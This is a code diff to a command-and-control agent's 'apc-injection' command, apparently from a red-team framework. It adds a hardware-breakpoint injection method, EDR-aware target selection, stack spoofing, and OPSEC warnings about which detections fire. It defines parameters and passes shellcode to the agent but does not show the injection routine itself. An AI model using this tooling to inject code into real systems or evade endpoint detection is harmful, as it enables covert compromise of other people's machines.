@@ -15,15 +15,16 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "apc-injection",
-		Description:         "Perform QueueUserAPC injection into an alertable thread. Use 'ts' command to find alertable threads (Suspended/DelayExecution).",
+		Description:         "Remote process injection via QueueUserAPC (default, requires alertable thread) or HWBP (DebugActiveProcess + DR0, no TID required).",
 		HelpString:          "apc-injection",
 		Version:             1,
-		MitreAttackMappings: []string{"T1055.004"}, // Process Injection: Asynchronous Procedure Call
+		MitreAttackMappings: []string{"T1055.004", "T1055"}, // Process Injection: APC + generic process injection (HWBP)
 		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
 		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "apcinjection_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -97,49 +98,143 @@ func init() {
 			},
 			{
 				Name:             "tid",
-				ModalDisplayName: "Target Thread ID",
+				ModalDisplayName: "Target Thread ID (APC method only)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				Description:      "The thread ID to queue the APC to (use 'ts' command to find alertable threads)",
+				Description:      "Thread ID to queue the APC to (use 'ts' command to find alertable threads). Only required when method=apc.",
 				DefaultValue:     0,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 2},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 2},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 2},
+				},
+			},
+			{
+				Name:             "method",
+				ModalDisplayName: "Injection Method",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "apc = QueueUserAPC into alertable thread (default). hwbp = DebugActiveProcess + DR0 hardware breakpoint redirect (no TID required, attaches as debugger briefly).",
+				DefaultValue:     "apc",
+				Choices:          []string{"apc", "hwbp"},
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
+				},
+			},
+			{
+				Name:             "target_api",
+				ModalDisplayName: "HWBP Breakpoint API",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Function to set DR0 breakpoint on (HWBP method only). Format: module!function. Default: ntdll!NtDelayExecution. Module must be a KnownDll for the address to be valid in the target.",
+				DefaultValue:     "ntdll!NtDelayExecution",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
+				},
+			},
+			{
+				Name:             "timeout_ms",
+				ModalDisplayName: "HWBP Timeout (ms)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				Description:      "Maximum time to wait for the breakpoint to fire (HWBP method only). Default 30000 (30s).",
+				DefaultValue:     30000,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 5},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 5},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 5},
+				},
+			},
+			{
+				Name:             "hwbp_debug",
+				ModalDisplayName: "HWBP Verbose Trace",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Enable verbose per-event tracing and DR0/DR7 readback verification (HWBP method only). Output can be substantial — first 60 events full detail + per-exception-code summary. Use to diagnose why a breakpoint never fires.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 7},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 7},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 7},
+				},
+			},
+			{
+				Name:             "target",
+				ModalDisplayName: "Target Selection",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "Auto-select injection target (EDR-aware scoring). PID still required for thread selection.",
+				DefaultValue:     "",
+				Choices:          []string{"", "auto", "auto-elevated", "auto-user"},
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "Default",
-						UIModalPosition:     2,
+						UIModalPosition:     6,
 					},
-					{
-						ParameterIsRequired: true,
-						GroupName:           "New File",
-						UIModalPosition:     2,
-					},
-					{
-						ParameterIsRequired: true,
-						GroupName:           "CLI",
-						UIModalPosition:     2,
-					},
+				},
+			},
+			{
+				Name:             "stack_spoof",
+				ModalDisplayName: "Stack Spoof",
+				CLIName:          "stack_spoof",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Spoof the call stack during injection API calls. Requires indirect_syscalls and stack_spoof build options.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 8},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 8},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 8},
 				},
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
-			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
-				TaskID:  taskData.Task.ID,
-				Success: true,
-				OpsecPreBlocked: false,
-				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: APC injection into PID %s. "+
+			method, _ := taskData.Args.GetStringArg("method")
+			if method == "" {
+				method = "apc"
+			}
+			var msg string
+			switch method {
+			case "hwbp":
+				targetAPI, _ := taskData.Args.GetStringArg("target_api")
+				if targetAPI == "" {
+					targetAPI = "ntdll!NtDelayExecution"
+				}
+				msg = fmt.Sprintf("OPSEC WARNING: HWBP injection into PID %s via DebugActiveProcess + DR0 on %s. "+
+					"Attaches as debugger to the target — Sysmon EID 10 (ProcessAccess with DEBUG_PROCESS rights), "+
+					"SetThreadContext into another process, and the cross-process VirtualAllocEx + WriteProcessMemory "+
+					"are all high-fidelity detections. Target receives no thread injection event but does receive a "+
+					"debug-attach event. Avoid against PPL / protected processes — DebugActiveProcess will fail.", pid, targetAPI)
+			default:
+				msg = fmt.Sprintf("OPSEC WARNING: APC injection into PID %s. "+
 					"Queues shellcode via NtQueueApcThread — requires alertable thread in target. "+
-					"Less common than CreateRemoteThread but still monitored by advanced EDR.", pid),
+					"Less common than CreateRemoteThread but still monitored by advanced EDR.", pid)
+			}
+			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
+				TaskID:             taskData.Task.ID,
+				Success:            true,
+				OpsecPreBlocked:    false,
+				OpsecPreMessage:    msg,
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
-			tid, _ := taskData.Args.GetNumberArg("tid")
+			method, _ := taskData.Args.GetStringArg("method")
+			if method == "" {
+				method = "apc"
+			}
+			var msg string
+			if method == "hwbp" {
+				msg = fmt.Sprintf("OPSEC AUDIT: HWBP injection completed against PID %s. Debugger attach + detach recorded. Artifact registered.", pid)
+			} else {
+				tid, _ := taskData.Args.GetNumberArg("tid")
+				msg = fmt.Sprintf("OPSEC AUDIT: APC injection queued for PID %s TID %d. Artifact registered.", pid, int(tid))
+			}
 			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
 				TaskID:              taskData.Task.ID,
 				Success:             true,
 				OpsecPostBlocked:    false,
-				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: APC injection queued for PID %s TID %d. Artifact registered.", pid, int(tid)),
+				OpsecPostMessage:    msg,
 				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -191,28 +286,66 @@ func init() {
 				return response
 			}
 
-			tid, err := taskData.Args.GetNumberArg("tid")
-			if err != nil {
-				logging.LogError(err, "Failed to get TID")
-				response.Success = false
-				response.Error = "Failed to get target Thread ID: " + err.Error()
-				return response
-			}
-			if tid <= 0 {
-				response.Success = false
-				response.Error = "Invalid Thread ID specified (must be greater than 0)"
-				return response
+			method, _ := taskData.Args.GetStringArg("method")
+			if method == "" {
+				method = "apc"
 			}
 
-			displayParams := fmt.Sprintf("Shellcode: %s\nTarget PID: %d\nTarget TID: %d", filename, pid, int(tid))
-			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("APC injection into PID %d TID %d", pid, int(tid)))
-
+			stackSpoof, _ := taskData.Args.GetBooleanArg("stack_spoof")
 			params := map[string]interface{}{
 				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
-				"tid":           int(tid),
+				"method":        method,
+				"stack_spoof":   stackSpoof,
 			}
+			var displayParams string
+
+			switch method {
+			case "hwbp":
+				targetAPI, _ := taskData.Args.GetStringArg("target_api")
+				if targetAPI == "" {
+					targetAPI = "ntdll!NtDelayExecution"
+				}
+				timeoutMs, _ := taskData.Args.GetNumberArg("timeout_ms")
+				if timeoutMs <= 0 {
+					timeoutMs = 30000
+				}
+				hwbpDebug, _ := taskData.Args.GetBooleanArg("hwbp_debug")
+				params["target_api"] = targetAPI
+				params["timeout_ms"] = int(timeoutMs)
+				params["hwbp_debug"] = hwbpDebug
+				debugSuffix := ""
+				if hwbpDebug {
+					debugSuffix = "\nVerbose Trace: enabled"
+				}
+				displayParams = fmt.Sprintf("Shellcode: %s\nTarget PID: %d\nMethod: hwbp\nBreakpoint API: %s\nTimeout: %dms%s",
+					filename, pid, targetAPI, int(timeoutMs), debugSuffix)
+				createArtifact(taskData.Task.ID, "Process Inject",
+					fmt.Sprintf("HWBP injection into PID %d (DR0 = %s, %dms timeout)", pid, targetAPI, int(timeoutMs)))
+			case "apc":
+				tid, terr := taskData.Args.GetNumberArg("tid")
+				if terr != nil {
+					logging.LogError(terr, "Failed to get TID")
+					response.Success = false
+					response.Error = "Failed to get target Thread ID: " + terr.Error()
+					return response
+				}
+				if tid <= 0 {
+					response.Success = false
+					response.Error = "APC method requires a valid Thread ID (use 'ts' to find alertable threads, or pick method=hwbp)"
+					return response
+				}
+				params["tid"] = int(tid)
+				displayParams = fmt.Sprintf("Shellcode: %s\nTarget PID: %d\nTarget TID: %d\nMethod: apc", filename, pid, int(tid))
+				createArtifact(taskData.Task.ID, "Process Inject",
+					fmt.Sprintf("APC injection into PID %d TID %d", pid, int(tid)))
+			default:
+				response.Success = false
+				response.Error = fmt.Sprintf("Unknown injection method %q (expected \"apc\" or \"hwbp\")", method)
+				return response
+			}
+
+			response.DisplayParams = &displayParams
 			paramsJSON, err := json.Marshal(params)
 			if err != nil {
 				response.Success = false
@@ -228,13 +361,23 @@ func init() {
 				Success: true,
 			}
 			host := processResponse.TaskData.Callback.Host
+			method, _ := processResponse.TaskData.Args.GetStringArg("method")
+			if method == "" {
+				method = "apc"
+			}
+			label := "APC injection"
+			eventTag := "[EXECUTION] APC queue injection"
+			if method == "hwbp" {
+				label = "HWBP injection (DebugActiveProcess + DR0 redirect)"
+				eventTag = "[EXECUTION] HWBP injection"
+			}
 			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
 				TaskID:           processResponse.TaskData.Task.ID,
 				BaseArtifactType: "Process Injection",
-				ArtifactMessage:  fmt.Sprintf("APC injection on %s", host),
+				ArtifactMessage:  fmt.Sprintf("%s on %s", label, host),
 			})
 			logOperationEvent(processResponse.TaskData.Task.ID,
-				fmt.Sprintf("[EXECUTION] APC queue injection on %s", host), true)
+				fmt.Sprintf("%s on %s", eventTag, host), true)
 			return response
 		},
 	})
